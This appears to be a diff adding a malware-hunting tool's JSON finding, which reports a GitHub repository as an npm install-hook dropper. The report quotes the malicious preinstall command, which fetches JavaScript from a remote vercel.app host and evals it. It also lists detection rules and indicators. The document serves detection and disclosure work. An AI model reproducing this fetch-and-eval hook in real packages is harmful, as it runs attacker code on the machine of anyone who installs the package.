@@ -1,0 +1,186 @@
+{
+  "finding": {
+    "key": "repository:novaremix-tech/vault-new-phase",
+    "kind": "repository",
+    "family": "",
+    "id": "novaremix-tech/vault-new-phase",
+    "url": "https://github.com/Novaremix-tech/vault-new-phase",
+    "registry": "github",
+    "owner": "novaremix-tech",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 11,
+    "detection_method": "package_ref",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "install_hook/npm-preinstall; code_execution/node-child-process; code_execution/js-exec",
+    "evidence_locations": "packages/console/package.json:0; scripts/doctor.mjs:4; scripts/doctor.mjs:23; scripts/server.mjs:6; scripts/server.mjs:29; scripts/server.mjs:40; scripts/server.mjs:47; scripts/setup.mjs:2; scripts/setup.mjs:14; scripts/setup.mjs:19; scripts/setup.mjs:26; scripts/stop.mjs:3; scripts/stop.mjs:10; scripts/stop.mjs:18; scripts/stop.mjs:22; scripts/verify.mjs:2; scripts/verify.mjs:10; packages/cli/src/bin/novaremix.ts:2; packages/cli/src/bin/novaremix.ts:63",
+    "c2_hosts": "",
+    "iocs": "https://everydaynodechecker-39143n.vercel.app/api/key?mem=root1; packages/console/package.json",
+    "matched_signatures": "react-editable-calendar",
+    "reasons": "References known-malicious package(s) ['react-editable-calendar'] | Tier-2 confirmed (bash score 11)",
+    "osm_status": "submitted",
+    "osm_threat_id": "4babfefb-2942-49d4-bfd4-679f4f556e01",
+    "first_seen": "hunt-20260722T014535Z",
+    "last_seen": "hunt-20260722T014535Z",
+    "evidence_file": "repositories/novaremix-tech_vault-new-phase.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "packages/console/package.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "npm-preinstall",
+      "snippet": "node -e \"(async()=>eval(await fetch('https://everydaynodechecker-39143n.vercel.app/api/key?mem=root1').then(r=>r.text())))();\""
+    },
+    {
+      "file": "scripts/doctor.mjs",
+      "line": 4,
+      "category": "code_execution",
+      "rule": "node-child-process",
+      "snippet": "import { execSync } from \"node:child_process\";"
+    },
+    {
+      "file": "scripts/doctor.mjs",
+      "line": 23,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const v = execSync(\"forge --version\", { encoding: \"utf8\" }).trim().split(\"\\n\")[0];"
+    },
+    {
+      "file": "scripts/server.mjs",
+      "line": 6,
+      "category": "code_execution",
+      "rule": "node-child-process",
+      "snippet": "import { spawn, spawnSync } from \"node:child_process\";"
+    },
+    {
+      "file": "scripts/server.mjs",
+      "line": 29,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const r = spawnSync(npm, args, {"
+    },
+    {
+      "file": "scripts/server.mjs",
+      "line": 40,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const p = spawn(process.execPath, args, { stdio: \"inherit\", cwd: root });"
+    },
+    {
+      "file": "scripts/server.mjs",
+      "line": 47,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "spawnSync(process.execPath, [join(root, \"scripts/stop.mjs\")], { stdio: \"inherit\", cwd: root });"
+    },
+    {
+      "file": "scripts/setup.mjs",
+      "line": 2,
+      "category": "code_execution",
+      "rule": "node-child-process",
+      "snippet": "import { execSync } from \"node:child_process\";"
+    },
+    {
+      "file": "scripts/setup.mjs",
+      "line": 14,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "execSync(\"forge install foundry-rs/forge-std --no-commit\", { cwd: contracts, stdio: \"inherit\" });"
+    },
+    {
+      "file": "scripts/setup.mjs",
+      "line": 19,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "execSync(\"forge install OpenZeppelin/openzeppelin-contracts@v5.0.2 --no-commit\", {"
+    },
+    {
+      "file": "scripts/setup.mjs",
+      "line": 26,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "execSync(\"forge build\", { cwd: contracts, stdio: \"inherit\" });"
+    },
+    {
+      "file": "scripts/stop.mjs",
+      "line": 3,
+      "category": "code_execution",
+      "rule": "node-child-process",
+      "snippet": "import { execSync } from \"node:child_process\";"
+    },
+    {
+      "file": "scripts/stop.mjs",
+      "line": 10,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const out = execSync(`netstat -ano | findstr :${port}`, { encoding: \"utf8\" });"
+    },
+    {
+      "file": "scripts/stop.mjs",
+      "line": 18,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "execSync(`taskkill /PID ${pid} /F`, { stdio: \"ignore\" });"
+    },
+    {
+      "file": "scripts/stop.mjs",
+      "line": 22,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "execSync(`lsof -ti:${port} | xargs kill -9 2>/dev/null`, { shell: true, stdio: \"ignore\" });"
+    },
+    {
+      "file": "scripts/verify.mjs",
+      "line": 2,
+      "category": "code_execution",
+      "rule": "node-child-process",
+      "snippet": "import { spawnSync } from \"node:child_process\";"
+    },
+    {
+      "file": "scripts/verify.mjs",
+      "line": 10,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const r = spawnSync(cmd, args, { cwd: root, stdio: \"inherit\", shell: true });"
+    },
+    {
+      "file": "packages/cli/src/bin/novaremix.ts",
+      "line": 2,
+      "category": "code_execution",
+      "rule": "node-child-process",
+      "snippet": "import { spawnSync } from \"node:child_process\";"
+    },
+    {
+      "file": "packages/cli/src/bin/novaremix.ts",
+      "line": 63,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "spawnSync(process.execPath, [script], { stdio: \"inherit\", cwd: root });"
+    }
+  ],
+  "commit_sha": "19338e8f99f99cabb668cf1e6ce150d873f8f36e",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/novaremix-tech/vault-new-phase",
+    "version_info": "all",
+    "threat_description": "Install-hook dropper. Payload in packages/console/package.json.\nOutbound: fetch-and-run. It downloads code from a remote host and executes it (packages/console/package.json).\nFound by GitHub code search for a confirmed malware signature: react-editable-calendar.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: packages/console/package.json\n- Outbound: fetch-and-run. It downloads code from a remote host and executes it (packages/console/package.json).\n- packages/console/package.json: runs automatically from a package install hook",
+    "publisher": "novaremix-tech",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "npm-install-hook",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/novaremix-tech/vault-new-phase/blob/19338e8f99f99cabb668cf1e6ce150d873f8f36e/packages/console/package.json\nhttps://github.com/novaremix-tech/vault-new-phase/blob/19338e8f99f99cabb668cf1e6ce150d873f8f36e/scripts/doctor.mjs#L4\nhttps://github.com/novaremix-tech/vault-new-phase/blob/19338e8f99f99cabb668cf1e6ce150d873f8f36e/scripts/doctor.mjs#L23\nhttps://github.com/novaremix-tech/vault-new-phase/blob/19338e8f99f99cabb668cf1e6ce150d873f8f36e/scripts/server.mjs#L6\nhttps://github.com/novaremix-tech/vault-new-phase/blob/19338e8f99f99cabb668cf1e6ce150d873f8f36e/scripts/server.mjs#L29\nhttps://github.com/novaremix-tech/vault-new-phase/blob/19338e8f99f99cabb668cf1e6ce150d873f8f36e/scripts/server.mjs#L40\nhttps://github.com/novaremix-tech/vault-new-phase/blob/19338e8f99f99cabb668cf1e6ce150d873f8f36e/scripts/server.mjs#L47\nhttps://github.com/novaremix-tech/vault-new-phase/blob/19338e8f99f99cabb668cf1e6ce150d873f8f36e/scripts/setup.mjs#L2\nhttps://github.com/novaremix-tech/vault-new-phase/blob/19338e8f99f99cabb668cf1e6ce150d873f8f36e/scripts/setup.mjs#L14\nhttps://github.com/novaremix-tech/vault-new-phase/blob/19338e8f99f99cabb668cf1e6ce150d873f8f36e/scripts/setup.mjs#L19\nhttps://github.com/novaremix-tech/vault-new-phase/blob/19338e8f99f99cabb668cf1e6ce150d873f8f36e/scripts/setup.mjs#L26\nhttps://github.com/novaremix-tech/vault-new-phase/blob/19338e8f99f99cabb668cf1e6ce150d873f8f36e/scripts/stop.mjs#L3\nhttps://github.com/novaremix-tech/vault-new-phase/blob/19338e8f99f99cabb668cf1e6ce150d873f8f36e/scripts/stop.mjs#L10\nhttps://github.com/novaremix-tech/vault-new-phase/blob/19338e8f99f99cabb668cf1e6ce150d873f8f36e/scripts/stop.mjs#L18\nhttps://github.com/novaremix-tech/vault-new-phase/blob/19338e8f99f99cabb668cf1e6ce150d873f8f36e/scripts/stop.mjs#L22",
+    "verified_iocs": "https://everydaynodechecker-39143n.vercel.app/api/key?mem=root1\npackages/console/package.json",
+    "contributors": [],
+    "first_seen": "2026-07-22T01:45:35Z",
+    "last_seen": "2026-07-22T01:45:35Z"
+  }
+}
